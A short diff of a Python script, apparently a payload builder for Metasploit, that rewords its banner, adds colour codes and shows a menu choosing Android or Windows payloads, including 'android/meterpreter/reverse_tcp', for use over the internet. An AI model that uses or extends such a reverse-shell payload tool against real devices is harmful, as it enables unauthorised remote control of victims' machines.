@@ -10,16 +10,16 @@ print("""
 It will automatically find your internal ip ,,, So You don't need to enter it manually,,you just need to enter 
 a Random port to forward over Internet
 
-USE YOUR MSF PAYLOAD OVER THE INTERNET WITHOUT ACTUAL PORT FORWARDING WITH
+USE YOUR MSF PAYLOAD OVER THE INTERNET by PORT FORWARDING WITHOUT
 ROUTER OR VPN
              >>>>coded by FEBIN REV
  """)
-print("""
+print("""\033[1;30m 
 [1] ANDROID PAYLOAD
 
 [2] WINDOWS PAYLOAD
 """)
-print("ENTER THE CHOICE....")
+print("\033[1;36m ENTER THE CHOICE....")
 payload_choice=int(input("FRportfwd>>># "))
 if payload_choice==1:
 	malware="android/meterpreter/reverse_tcp"
